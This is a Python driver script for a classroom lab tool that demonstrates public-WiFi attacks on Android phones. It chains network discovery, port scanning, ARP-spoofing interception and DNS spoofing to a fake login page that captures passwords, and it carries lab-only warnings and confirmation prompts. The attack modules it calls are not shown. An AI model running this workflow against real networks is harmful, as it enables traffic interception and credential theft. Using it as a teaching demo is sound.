#!/usr/bin/env python3
"""
================================================================================
  Public WiFi Attack Demonstration Agent — Android Edition
  IFSul / IFF — Cybersecurity Course (pratica 2)
================================================================================

  ⚠️  AUTHORIZED LABORATORY USE ONLY  ⚠️

  This tool is intended for an ISOLATED CLASSROOM LAB on a router with NO
  internet uplink. It exists purely to demonstrate how dangerous it is for
  a student (or anyone) to connect their phone to a public/untrusted WiFi.

  Running any of these techniques against a network or device you do NOT own
  or have EXPLICIT written permission to test is illegal in most countries
  (Brazil: Lei 12.737/2012 - Lei Carolina Dieckmann; Marco Civil da Internet).

  Author: Cybersecurity Course — pratica2
================================================================================
"""

import os
import sys
import signal
import argparse
from datetime import datetime

# Local modules
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from modules import discovery, scanning, mitm, dns_spoof, fake_server, report
from modules.utils import (
    BANNER, COLORS, info, ok, warn, err, ask_confirm,
    require_root, ensure_tools, get_default_iface, get_subnet_for_iface,
    pause,
)


# ----------------------------------------------------------------------------
# State shared across phases (so the report has full context)
# ----------------------------------------------------------------------------
SESSION = {
    "started_at": datetime.now().isoformat(timespec="seconds"),
    "interface": None,
    "subnet": None,
    "gateway": None,
    "discovered_hosts": [],   # list of dicts from discovery
    "android_target": None,   # dict
    "scan_results": None,     # dict
    "mitm_log": [],           # list of strings (events / observations)
    "dns_spoof_log": [],      # list of strings
    "fake_server_log": [],    # list of strings (captured creds, etc.)
    "phases_run": [],
}


def phase_discovery():
    info("Phase 1 — Network Discovery (nmap + ARP)")
    print("""
    The attacker is on the same Wi-Fi as the victim. Before anything else
    they map the network: who's connected, what they are, how they look.
    On a public Wi-Fi this happens in SECONDS without anyone noticing.
    """)
    if not ask_confirm("Run network discovery now?", default=True):
        return

    iface = SESSION["interface"]
    subnet = SESSION["subnet"]

    hosts, gateway = discovery.full_discovery(iface=iface, subnet=subnet)
    SESSION["discovered_hosts"] = hosts
    SESSION["gateway"] = gateway
    SESSION["phases_run"].append("discovery")

    # Highlight Android
    android = discovery.pick_android_target(hosts)
    if android:
        SESSION["android_target"] = android
        ok(f"Android target identified: {android['ip']}  ({android.get('vendor','?')})")
    else:
        warn("No clearly Android device auto-detected. You can pick one manually.")
        SESSION["android_target"] = discovery.manual_pick(hosts)

    pause()


def phase_scanning():
    info("Phase 2 — Detailed Android Scan (ports + services + OS)")
    if not SESSION["android_target"]:
        err("No Android target selected. Run Phase 1 first.")
        return
    print("""
    Even when the phone screen is locked, services may be exposed: media
    servers, debug bridges, sync daemons. We'll show what an attacker
    sees from the same Wi-Fi.
    """)
    if not ask_confirm("Run detailed scan against the Android device?", default=True):
        return

    target_ip = SESSION["android_target"]["ip"]
    SESSION["scan_results"] = scanning.scan_android(target_ip)
    SESSION["phases_run"].append("scanning")
    pause()


def phase_mitm():
    info("Phase 3 — ARP Spoofing / Man-in-the-Middle")
    if not SESSION["android_target"] or not SESSION["gateway"]:
        err("Need a target and a gateway. Run Phase 1 first.")
        return
    print(f"""
    {COLORS['warn']}HIGH IMPACT PHASE{COLORS['end']}
    We will poison the ARP cache of:
        Victim  : {SESSION['android_target']['ip']}
        Gateway : {SESSION['gateway']}
    so that the victim's traffic flows THROUGH this attacker machine.

    On a real public Wi-Fi this means the attacker silently sits between
    the user and the internet, watching DNS queries, plaintext HTTP, etc.
    """)
    warn("This will visibly slow / disrupt the victim's connection while it runs.")
    if not ask_confirm("Start ARP spoofing?", default=False):
        return

    duration = 60
    try:
        duration = int(input(f"{COLORS['info']}[?] Duration in seconds (default 60, max 600): {COLORS['end']}").strip() or 60)
        duration = max(10, min(duration, 600))
    except ValueError:
        pass

    events = mitm.run_arp_spoof(
        victim_ip=SESSION["android_target"]["ip"],
        gateway_ip=SESSION["gateway"],
        iface=SESSION["interface"],
        duration_sec=duration,
    )
    SESSION["mitm_log"] = events
    SESSION["phases_run"].append("mitm")
    pause()


def phase_dns_spoof_and_fakepage():
    info("Phase 4 — DNS Spoofing + Fake Login Page")
    if not SESSION["android_target"] or not SESSION["gateway"]:
        err("Need a target and a gateway. Run Phase 1 first.")
        return
    print(f"""
    {COLORS['warn']}MOST VISUAL DEMO — works fully offline{COLORS['end']}

    Plan:
      1. Start a local web server hosting a FAKE login page
         (Google / Instagram / WiFi-portal — pick one).
      2. Reply to DNS queries from the victim with OUR IP, so when
         they open www.google.com on their Android, they land on
         OUR fake page.
      3. If they type a password, we capture it locally (in cleartext,
         to make the lesson land).

    No internet is required for this — that's exactly the scary part.
    """)
    if not ask_confirm("Proceed with DNS spoof + fake page demo?", default=False):
        return

    page = fake_server.choose_page()
    fake_server.write_capture_dir()

    # Start fake HTTP server (port 80)
    server_proc = fake_server.start(page=page)
    SESSION["fake_server_log"].append(f"Fake page '{page}' served on port 80")

    try:
        # Start DNS spoofing — also re-uses ARP poisoning under the hood
        dns_events = dns_spoof.run(
            victim_ip=SESSION["android_target"]["ip"],
            gateway_ip=SESSION["gateway"],
            iface=SESSION["interface"],
            attacker_ip=discovery.get_iface_ip(SESSION["interface"]),
        )
        SESSION["dns_spoof_log"] = dns_events
        SESSION["phases_run"].append("dns_spoof")
    finally:
        fake_server.stop(server_proc)
        creds = fake_server.read_captured_creds()
        if creds:
            SESSION["fake_server_log"].extend(creds)

    pause()


def phase_report():
    info("Phase 5 — Generate Markdown Report")
    path = report.generate(SESSION)
    ok(f"Report written to: {path}")
    pause()


# ----------------------------------------------------------------------------
# Menu
# ----------------------------------------------------------------------------
MENU = """
{c}╔════════════════════════════════════════════════════════════════╗
║   PUBLIC WIFI ATTACK DEMO — ANDROID EDITION (LAB ONLY)         ║
╠════════════════════════════════════════════════════════════════╣
║   1) Phase 1 — Network Discovery (nmap + ARP)                  ║
║   2) Phase 2 — Detailed scan of Android target                 ║
║   3) Phase 3 — ARP spoofing / MITM (visual disruption)         ║
║   4) Phase 4 — DNS spoofing + fake login page                  ║
║   5) Phase 5 — Generate Markdown report                        ║
║                                                                ║
║   A) Run ALL phases sequentially                               ║
║   S) Show current session state                                ║
║   Q) Quit                                                      ║
╚════════════════════════════════════════════════════════════════╝{e}
""".format(c=COLORS["banner"], e=COLORS["end"])


def show_state():
    print(f"\n{COLORS['info']}--- Session state ---{COLORS['end']}")
    print(f"  Interface     : {SESSION['interface']}")
    print(f"  Subnet        : {SESSION['subnet']}")
    print(f"  Gateway       : {SESSION['gateway']}")
    print(f"  Hosts found   : {len(SESSION['discovered_hosts'])}")
    if SESSION["android_target"]:
        a = SESSION["android_target"]
        print(f"  Android target: {a['ip']} ({a.get('vendor','?')}) {a.get('hostname','')}")
    print(f"  Phases run    : {', '.join(SESSION['phases_run']) or '(none)'}")
    print()


def run_all():
    phase_discovery()
    phase_scanning()
    phase_mitm()
    phase_dns_spoof_and_fakepage()
    phase_report()


def cleanup_handler(signum, frame):
    warn("\nInterrupt received — running cleanup...")
    try:
        mitm.emergency_restore()
    except Exception:
        pass
    try:
        fake_server.emergency_stop()
    except Exception:
        pass
    sys.exit(130)


def main():
    parser = argparse.ArgumentParser(description="Public WiFi attack demo (lab only)")
    parser.add_argument("-i", "--interface", help="Network interface (e.g. wlan0). Auto-detected if omitted.")
    parser.add_argument("-s", "--subnet", help="Subnet in CIDR (e.g. 192.168.1.0/24). Auto-detected if omitted.")
    parser.add_argument("--all", action="store_true", help="Run all phases without showing the menu")
    args = parser.parse_args()

    print(BANNER)

    require_root()
    ensure_tools()

    SESSION["interface"] = args.interface or get_default_iface()
    SESSION["subnet"] = args.subnet or get_subnet_for_iface(SESSION["interface"])

    ok(f"Interface: {SESSION['interface']}    Subnet: {SESSION['subnet']}")

    signal.signal(signal.SIGINT, cleanup_handler)
    signal.signal(signal.SIGTERM, cleanup_handler)

    if args.all:
        run_all()
        return

    while True:
        print(MENU)
        choice = input(f"{COLORS['info']}[?] Choose: {COLORS['end']}").strip().lower()
        if choice == "1":
            phase_discovery()
        elif choice == "2":
            phase_scanning()
        elif choice == "3":
            phase_mitm()
        elif choice == "4":
            phase_dns_spoof_and_fakepage()
        elif choice == "5":
            phase_report()
        elif choice == "a":
            run_all()
        elif choice == "s":
            show_state()
        elif choice == "q":
            ok("Bye. Stay ethical. 🛡️")
            sys.exit(0)
        else:
            warn("Unknown choice.")


if __name__ == "__main__":
    main()
